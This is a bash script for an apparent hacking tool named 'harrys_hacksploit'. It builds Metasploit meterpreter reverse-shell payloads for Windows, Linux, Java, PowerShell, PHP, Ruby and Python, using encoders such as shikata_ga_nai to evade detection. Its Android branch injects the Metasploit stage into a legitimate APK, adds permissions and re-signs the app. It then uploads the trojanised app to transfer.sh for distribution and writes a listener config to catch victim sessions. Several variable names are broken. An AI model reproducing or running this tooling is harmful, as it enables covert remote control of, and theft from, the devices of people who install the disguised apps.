#!/bin/bash


dt=$(date '+%d/%m/%Y %H:%M:%S');
dir=$(pwd)



function jumpto
{
    label=$1
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}

start=${1:-"start"}

jumpto $start


payloadcreationstart:

symbol1=$(toilet -f digital -F metal ....PaYLoAD.cReAtIoN......)
echo "$symbol1"

###get platform list

platformlist=$(sqlite3 "$dir/db/harrys_hacksploit.db" "select name from platforms") 
echo "------------------------------------------------"
SAVEIFS=$IFS
IFS=$'\n'
platformlist=($platformlist)
IFS=$SAVEIFS
for (( i=0; i<${#platformlist[@]}; i++ ))
do
    num=$(( $i + 1 ))
    echo "$num:  ${platformlist[$i]}"
done
echo "------------------------------------------------"
echo
echo
echo "choose a platform and create payload or connect to victim"
echo
read choice
case $choice in
    ''|*[!0-9]*) jumpto payloadcreationstart ;;
    *) echo  ;;
esac
echo

if [ "$choice" = "0" ]
then
    bash $dir/harrys_hacksploit.sh
fi

url_file=0
platform="${platformlist[$choice]}"
plat="${platformlist[$choice]}"
platform="platform = $platform"
platname=$(echo "$plat" | sed 's/\//./g')





if [ "$plat" = "android/generic" ]
then
    plat="android"
echo "looking for apk files"
find / -name "*.apk" > $dir/menus/apk
echo "dont inject payload" >> $dir/menus/apk


###get apk list

apklist:

apklist=$(sqlite3 "$dir/db/harrys_hacksploit.db" "select input from menus where menu='apk'")
echo "------------------------------------------------"
SAVEIFS=$IFS
IFS=$'\n'
apklist=($apklist)
IFS=$SAVEIFS
for (( i=0; i<${#apklist[@]}; i++ ))
do
    num=$(( $i + 1 ))
    echo "$num:  ${apklist[$i]}"
done
echo "------------------------------------------------"
echo
echo
echo "insert num,path or url of the apk"
echo "$apkshow"
read choice
echo
#echo "$choice" | grep -oE [a-zA-Z]

checker=$(grep '[a-zA-Z]' <<< "$choice")



if [ "$choice" = "0" ]
then
    jumpto payloadcreationstart
elif [ "$choice" = "0.0" ]
then
    echo "lalal"
fi

if [ -n "$checker" ]
then
    pick=1
else
    pick=2
fi



if [ $pick = 1 ]
then
    url="$choice"
elif [ $pick = 2 ] 
then
    num=$(( $choice - 1 ))
    url="${apklist[$num]}"
fi
platform="$platform" 
apk = "${apklist[$choice]}"
echo
echo
echo

###check if file or url

httpcheck=$(echo "$url" | grep http)
wwwcheck=$(echo "$url" | grep www)
decheck=$(echo "$url" | grep .de)
comcheck=$(echo "$url" | grep .com)
netcheck=$(echo "$url" | grep .net)
orgcheck=$(echo "$url" | grep .org)

if [ -n "$httpcheck" ] || [ -n "$wwwcheck" ] || [ -n "$decheck" ] || [ -n "$comcheck" ] || [ -n "$netcheck" ] || [ -n "$orgcheck" ]
then
    url_file=1
else
    url_file=2
fi

fi


###get server list

serverlist:

serverlist=$(sqlite3 "$dir/db/harrys_hacksploit.db" "select server_ip,date from server")
echo "------------------------------------------------"
echo
echo "[NUM]  [SERVER]               [ADDED]"
echo
SAVEIFS=$IFS
IFS=$'\n'
serverlist=($serverlist)
IFS=$SAVEIFS
for (( i=0; i<${#serverlist[@]}; i++ ))
do
    num=$(( $i + 1 ))
    echo "$num.     ${serverlist[$i]}" | sed 's/|/          /g'
done
echo
echo
echo
echo "0.[NUM] = [    delete ip     ]"
echo "0.0     = [ delete all ip's! ]"
echo "0       = [     <<<back      ]" 
echo "------------------------------------------------"
echo
echo
echo
echo "platform = $platform"
echo
echo "ip or url for payload to connect"
read choice
echo



if [ "$choice" = "0" ] && [ "$plat" = "android/generic" ]
then
    jumpto apklist
elif [ "$choice" = "0" ]
then
    jumpto payloadcreationstart
elif [ "$choice" = "0.0" ]
then
    sqlite3 "$dir/db/harrys_hacksploit.db" "DELETE FROM server WHERE rowid > -1"
    jumpto serverlist
fi


checker=$(grep '[a-zA-Z]' <<< "$choice")
checker2=$(grep '[.]' <<< "$choice")

if [ -n "$checker1" ] || [ -n "$checker2" ]
then
    pick=1
else
    pick=2
fi



if [ $pick = 1 ]
then
    server="$coice"
    sqlite3 "$dir/db/harrys_hacksploit.db" "insert into server(server_ip,date) values('$choice','$dt')"
elif [ $pick = 2 ] 
then
    listcheck=3
num=$(( $choice - 1 ))
server="${serverlist[$num]}"
IN="$server" 
set -- "$IN" 
IFS="|"; declare -a Array=($*) 
server="${Array[0]}"


echo
fi


if [ $listcheck = 2 ]
then
    #server="${serverlist[$choice]}"
    echo "added server [ $server ] to server list"
    echo "$server" >> "$dir/menus/server"
elif [ $listcheck = 1 ]
then
    echo "already in server list !"
elif [ $listcheck = 3 ]
then
    echo
fi

echo
echo


portlist:

portlist=$(sqlite3 "$dir/db/harrys_hacksploit.db" "select port from ports")
echo "------------------------------------------------"
echo
echo "[NUM]  [PORT]"
echo
SAVEIFS=$IFS
IFS=$'\n'
portlist=($portlist)
IFS=$SAVEIFS
for (( i=0; i<${#portlist[@]}; i++ ))
do
    num=$(( $i + 1 ))
    echo "$num.     ${portlist[$i]}"
done
echo
echo
echo
echo "0.[NUM] = [    delete port     ]"
echo "0.0     = [ delete all port's! ]"
echo "0       = [     <<<back      ]"   
echo "------------------------------------------------"
echo
echo
echo "$platform"
echo "ip = $server"
echo
echo "select port > 100"
read choice


echo


if [ "$choice" = "0" ]
then
    jumpto serverlist
elif [ "$choice" = "0.0" ]
then
    sqlite3 "$dir/db/harrys_hacksploit.db" "DELETE FROM ports WHERE rowid > -1"
    jumpto portlist
fi




if [ $choice -gt 99 ]
then
    pick=1
elif [ $choice -lt 100 ] 
then 
    pick=2
fi



if [ $pick = 1 ]
then
    port="$coice"
    sqlite3 "$dir/db/harrys_hacksploit.db" "insert into ports(port) values('$choice')"


elif [ $pick = 2 ]
then
    echo 
    listcheck=3
    num=$(( $choice - 1 ))
    port=${portlist[$num]}
fi
if [ $listcheck = 2 ]
then
    echo "added port [ $port ] to port list"
    echo "$port" >> "$dir/menus/port"
elif [ $listcheck = 1 ]
then
    echo "already in port list !"
elif [ $listcheck = 3 ]
then
    echo
fi

echo
echo
echo



###get router list

routerlist:

routerlist=$(sqlite3 "$dir/db/harrys_hacksploit.db" "select router_ip,date from router")
echo
echo
echo "$platform"
echo "ip = $server"
echo "port = $port"
echo
echo "------------------------------------------------"
echo
echo "[NUM]  [SERVER]               [ADDED]"
echo
SAVEIFS=$IFS
IFS=$'\n'
routerlist=($routerlist)
IFS=$SAVEIFS
for (( i=0; i<${#routerlist[@]}; i++ ))
do
    num=$(( $i + 1 ))
    echo "$num.     ${routerlist[$i]}" | sed 's/|/          /g'
done
echo
echo
echo
echo "0.[NUM] = [    delete ip     ]"
echo "0.0     = [ delete all ip's! ]"
echo "0       = [     <<<back      ]"     
echo "------------------------------------------------"
echo "ip for host to listen (if the ip isn't in the same network as you then you have to pick your router's ip)"
read choice








if [ "$choice" = "0" ]
then
    jumpto portlist
elif [ "$choice" = "0.0" ]
then
    sqlite3 "$dir/db/harrys_hacksploit.db" "DELETE FROM router WHERE rowid > -1"
    jumpto routerlist
fi




checker1=$(grep '[a-zA-Z]' <<< "$choice")
checker2=$(grep '[.]' <<< "$choice")

if [ -n "$checker1" ] || [ -n "$checker2" ]
then
    pick=1
else
    pick=2
fi



if [ $pick = 1 ]
then
    router="$coice"
    sqlite3 "$dir/db/harrys_hacksploit.db" "insert into router(router_ip,date) values('$choice','$dt')"
elif [ $pick = 2 ] 
then
    listcheck=3
num=$(( $choice - 1 ))
router="${routerlist[$num]}"
IN="$router" 
set -- "$IN" 
IFS="|"; declare -a Array=($*) 
router="${Array[0]}"


echo
fi


if [ $listcheck = 2 ]
then
    echo "added router [ $router ] to router list"
    echo "$router" >> "$dir/menus/router"
elif [ $listcheck = 1 ]
then
    echo "already in router list !"
elif [ $listcheck = 3 ]
then
    echo
fi
echo
echo
echo "$platform"
echo "$apkshow"
echo "ip = $server"
echo "port = $port"
echo "ip to listen = $router"
echo
toilet -f digital -F metal ....cReAtiNg.pAyLoAd......
echo "creating payload [ $platname.$server.$port ]"
echo




if [ "$plat" = "osx/x64" ]
then
    echo
fi



if [ "$plat" = "osx/x86" ]
then
    echo "osx/86"
fi

if [ "$plat" = "osx/generic" ]
then
    echo "osx/generic"
fi



if [ "$plat" = "java/x64" ]
then
    plat="java"
    ext="java"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -a x64 -e x64/xor LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.java
fi



if [ "$plat" = "java/x86" ]
then
    plat="java"
    ext="java"
    echo "creating payload"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -a x86 -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.java
fi

if [ "$plat" = "java/generic" ]
then
    plat="java"
    ext="java"
    msfvenom -p "$plat/meterpreter/reverse_tcp" LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.java
fi



if [ "$plat" = "powershell/x64" ]
then
    plat="powershell"
    ext="ps1"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e cmd/powershell_base64 LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.ps1
fi

if [ "$plat" = "powershell/x86" ]
then
    plat="powershell"
    ext="ps1"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.ps1
fi


if [ "$plat" = "powershell/generic" ]
then
    plat="powershell"
    ext="ps1"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e cmd/powershell_base64 LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.ps1
fi


if [ "$plat" = "php/x64" ]
then
    ext="php"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e php/base64 LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.php
fi

if [ "$plat" = "php/x86" ]
then
    ext="php"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e php/base64 LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.php
fi

if [ "$plat" = "php/generic" ]
then
    ext="php"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e php/base64 LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.php
fi






if [ "$plat" = "ruby/x64" ]
then
    ext="rb"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.rb
fi


if [ "$plat" = "ruby/x86" ]
then
    ext="rb"
    msfvenom -p "ruby/shell_reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.rb
fi


if [ "$plat" = "ruby/generic" ]
then
    ext="rb"
    msfvenom -p "cmd/unix/reverse_ruby" LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.rb
fi



if [ "$plat" = "python/x86" ]
then
    ext="py"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.py
fi


if [ "$plat" = "python/x64" ]
then
    ext="py"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.py
fi


if [ "$plat" = "python/generic" ]
then
    ext="py"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.py
fi






if [ "$plat" = "linux/x64" ]
then
    ext="elf"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x64/xor LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.elf
fi



if [ "$plat" = "linux/x86" ]
then
    
    ext="elf"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.elf
fi


if [ "$plat" = "linux/generic" ]
then
    plat="linux/x86"
    ext="exe"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -f elf LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.elf
fi





if [ "$plat" = "windows/x86" ]
then
    plat="windows/86"
    ext="exe"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x86/shikata_ga_nai LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.exe
fi




if [ "$plat" = "windows/x64" ]
then
    plat="windows/x64"
    ext="exe"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x64/xor LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.exe
fi


if [ "$plat" = "windows/generic" ]
then
    plat="windows"
    ext="exe"
    msfvenom -p "$plat/meterpreter/reverse_tcp" -e x64/xor LHOST=$server LPORT=$port -o $dir/payloads/$platname.$server.$port.$ext
fi

payname="$platname.$server.$port.$ext"
paypath="$dir/payloads/$platname.$server.$port.$ext"
###getting apk's



if [ $url_file = 1 ] && [ "$plat" = android ]
then
    echo "download apk"
    wget -O $dir/temp/apk.apk "$url"

elif [ $url_file = 2 ] && [ "$plat" = android ]
then
    cp -f "$url" $dir/temp/apk.apk
fi

###decompile apk's

if [ "$plat" = android ]
then

msfvenom -p "$payload" LHOST=$server LPORT=$port -o $dir/temp/sploit.apk
apktool d apk.apk -f -o $dir/temp/apk
apktool d sploit.apk -f -o $dir/temp/sploit


###injecting payloads

cp -R $dir/temp/sploit/smali/com/metasploit $dir/temp/apk/smali/com/metasploit
awk '!f && /<uses-permission/ {$0="µ"; f=1}1' $dir/temp/apk/AndroidManifest.xml > "$dir/temp/mani";
permissions=$(cat "$dir/permissions")
mani=$(cat "$dir/temp/mani")
IN="$mani" 
set -- "$IN" 
IFS="µ"; declare -a Array=($*) 
echo "${Array[0]}" > "$dir/temp/apk/AndroidManifest.xml"
echo "$permissions" >> "$dir/temp/apk/AndroidManifest.xml"
echo "${Array[1]}" >> "$dir/temp/apk/AndroidManifest.xml"
string=$(cat "$dir/temp/apk/AndroidManifest.xml" | grep -oP '(?<=android:name=").*(?=">)')
IFS='
' read -r -a array <<< "$string"
apkname="${array[0]}"
apkdir=$(echo "$apkname" | sed 's/\./\//g')
sed 's/;->onCreate(Landroid\/os\/Bundle;)V/;->onCreate(Landroid\/os\/Bundle;)V\n    invoke-static \{p0\}, Lcom\/metasploit\/stage\/Payload;->start(Landroid\/content\/Context;)V/g' "$dir/temp/apk/smali/$apkdir.smali" > "$dir/temp/temp.smali";
cp -f "$dir/temp/temp.smali" "$dir/temp/apk/smali/$apkdir.smali"



###recompile+sign apk

apktool b $dir/temp/apk -f -o $dir/temp/$apkname.apk
/usr/lib/jvm/java-8-openjdk-amd64/bin/jarsigner -verbose -keystore $dir/paykey.keystore -storepass kaka123 -digestalg SHA1 $dir/temp/$apkname.apk mykey



###upload apk


curl --progress-bar --upload-file "$dir/temp/$apkname.apk" "https://transfer.sh/$apkname.apk" > $dir/temp/upload
apkurl=$(cat "$dir/temp/upload")
cp -f "$dir/temp/$apkname.apk" "$dir/injected_apks/$apkname.$server.$port.apk"
echo "$apkurl" > "$dir/uploads/$apkname.$port.$server"
payname="$apkname.$server.$port.apk"
paypath="$dir/injected_apks/$apkname.$server.$port.apk"

fi #fin android






###saving msf config .rc



payloadconnect=$(echo "use exploit/multi/handler
set payload $plat/meterpreter/reverse_tcp
set LHOST $router
set LPORT $port
set ExitOnSession false
exploit -j -z
resource $dir/resource/RESOURCEINPUT")

sqlite3 "$dir/db/harrys_hacksploit.db" "insert into payloads(payload_name,payload_path,payload_platform,payload_port,payload_server,payload_router,payload_connect) values('$payname','$paypath','$platform','$port','$server','$router','$payloadconnect')"


echo
echo
toilet -f digital -F metal ....PaYLoAD.cReAtIoN......
toilet -f digital -F metal ........sUcCesS...........
echo
echo
echo 'place the payload and start "CONNECT TO PAYLOAD" in mainmenu'
sleep 2
bash "$dir/harrys_hacksploit.sh"
#echo "use exploit/multi/handler" >> "$dir/rc/$platname.$server.$port.rc"
#echo "set payload $plat/meterpreter/reverse_tcp" >> "$dir/rc/$platname.$server.$port.rc"
#echo "set LHOST $router" >> "$dir/rc/$platname.$server.$port.rc"
#echo "set LPORT $port" >> "$dir/rc/$platname.$server.$port.rc"
#echo "set ExitOnSession false" >> "$dir/rc/$platname.$server.$port.rc"
#echo "exploit -j -z" >> "$dir/rc/$platname.$server.$port.rc"
#echo "resource $dir/resource/RESOURCEINPUT" >> "$dir/rc/$platname.$server.$port.rc"






